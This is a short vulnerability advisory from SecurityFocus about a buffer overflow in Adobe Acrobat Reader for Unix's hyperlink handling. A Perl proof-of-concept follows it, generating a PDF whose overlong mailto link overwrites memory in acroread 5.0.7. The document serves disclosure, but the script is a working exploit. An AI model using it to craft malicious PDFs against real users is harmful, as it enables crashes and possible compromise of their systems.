source: http://www.securityfocus.com/bid/8069/info

An individual has reported that Adobe Acrobat Reader for Unix systems is vulnerable to a buffer overflow condition. The error is allegedly related to the processing of hyperlinks, in the function "WWWLaunchNetscape". The flaw is triggered only when Netscape is set as the browser to be used in the preferences (this is the default configuration). This vulnerability may be exploited through maliciously constructed PDF files. 

It should be noted that it is not confirmed that Acrobat Reader for Windows is not affected. Users of both versions should exhibit caution until there is a response from the vendor. 4.x versions of the reader are reportedly not prone to this issue.

#!/usr/bin/perl --
#
# Demo for acroread 5.0.7 on Debian Linux
#
print '
Writing TeX file ...
';
# For acroread 5.0.5 use 248 Bs instead of 504
open P, '>attack.tex';
print P '
\documentclass[11pt]{letter}
\usepackage{times}
\usepackage[pdfpagemode=none,pdfstartview=FitH]{hyperref}
\begin{document}
   \href{mailto:X',("B"x504).("A"x4),'}
   {\texttt{mailto:X("B"x504).("A"x4)}}
\end{document}
';
close P;
#
print '
Running pdflatex ...
';
system 'pdflatex attack';
#
#!#
